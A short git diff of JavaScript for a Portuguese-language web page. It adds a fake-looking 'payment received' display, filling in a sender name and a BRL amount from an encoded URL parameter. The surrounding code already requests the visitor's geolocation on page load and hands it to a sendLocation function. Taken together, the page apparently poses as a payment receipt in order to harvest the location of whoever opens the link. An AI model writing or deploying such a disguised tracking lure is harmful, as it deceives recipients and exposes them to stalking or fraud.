@@ -1,3 +1,5 @@
+import { decodeReceiptData, DEFAULT_RECEIPT_DATA } from "./receipt-data.js";
+
 window.addEventListener("load", () => {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
@@ -9,6 +11,16 @@ window.addEventListener("load", () => {
         alert("Algo deu errado. Tente novamente mais tarde.");
     }
 });
+
+const encodedReceiptData = new URLSearchParams(window.location.search).get("dados");
+const receiptData = decodeReceiptData(encodedReceiptData) || DEFAULT_RECEIPT_DATA;
+const currencyFormatter = new Intl.NumberFormat("pt-BR", {
+    style: "currency",
+    currency: "BRL"
+});
+
+document.getElementById("nome-remetente").textContent = receiptData.nome;
+document.getElementById("valor-recebido").textContent = currencyFormatter.format(receiptData.valor);
 
 const dataAtual = new Date();
 const dia = String(dataAtual.getDate()).padStart(2, '0');
